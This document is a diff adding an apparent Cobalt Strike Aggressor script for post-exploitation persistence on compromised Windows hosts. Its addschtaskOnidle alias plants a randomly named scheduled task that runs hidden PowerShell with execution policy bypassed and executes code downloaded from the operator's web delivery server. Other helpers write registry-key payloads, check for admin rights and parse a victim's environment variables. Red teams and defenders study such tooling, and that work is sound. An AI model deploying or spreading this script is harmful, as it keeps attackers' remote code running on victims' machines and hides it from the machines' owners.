@@ -1,0 +1,98 @@
+
+global('%bvars');
+
+# request environment variables for every new Beacon that comes in.
+on beacon_initial {
+
+        #bshell($1, "set");
+	#bsleep($1,0);
+}
+
+# parse environment vars from beacon output
+on beacon_output {
+        # do nothing if we already know the env variables
+        if ($1 in %bvars) {
+                return;
+        }
+        # verify this is output for the set command
+        else if ("*APPDATA=*" iswm $2) {
+                local('$temp $key $value');
+                foreach $temp (split("\r\n", $2)) {
+                        if ($temp ismatch '(.*?)=(.*)') {
+                                ($key, $value) = matched();
+                                %bvars[$1][$key] = $value;
+                        }
+                }
+        }
+}
+
+# the long way
+sub randomString {
+        local('$alpha $res $x $size');
+        $size = $1;
+        $alpha  = "abcdefghijklmnopqrstuvwxyz";
+        $alpha .= lc($alpha);
+        $alpha  = split("", $alpha);
+        for ($x = 0; $x <= ($size); $x++) {
+                $res .= rand($alpha);
+        }
+        return "$res";
+}
+
+alias addschtaskOnidle {
+
+	@tasknames = pref_get_list("tasknames.list");
+
+	$task = @tasknames[rand(size(@tasknames))];
+
+	%site = getSiteURL();
+
+	$downloadip = %site['Host'];
+	$port = %site['Port'];
+	$uri = %site['URI'];
+
+	$schtask = "schtasks /create /tn $task /tr \"c:\\windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://" . $downloadip . ": $+ $port $+ $uri $+ '''))'\" /sc onidle /i 30 /f";
+	bshell($1,$schtask);
+	blog($1,"schtask dropped..");
+	bnote($1,"schtask dropped");
+}
+
+alias schtasksclean {
+	@tasknames = pref_get_list("tasknames.list");
+
+	foreach $task (@tasknames) {
+		bshell($1,"schtasks /delete /tn $task /f");
+	}
+
+
+}
+
+sub isAdmin {
+    return iff( right(beacon_info($1, "user"), 2) eq " *" , true, false);
+}
+
+sub addRegKey {
+	$hive,$keyPath,$keyName,$regPayload = @_ ;
+	$powershell = "New-ItemProperty -Force -Path \" $+ $hive $+ : $+ $keyPath $+ \" -Name \" $+ $keyName $+ \" -PropertyType String -Value \" $+ $regPayload $+ \"";
+	blog($powershell);
+	bpowershell($1, $powershell);
+}
+
+sub remRegKey {
+    $powershell = "Remove-ItemProperty -Path " . $hive . ":" . $keyPath . " -Name " . $keyName;
+    bpowershell($1, $powershell);
+}
+
+
+sub getSiteURL {
+
+    foreach $site (sites()) {
+       if ($site['Description'] eq "Scripted Web Delivery (powershell)"){
+	   return $site;
+       } 
+	   
+    }
+	berror($1,"no web delivery started");
+} 
+
+
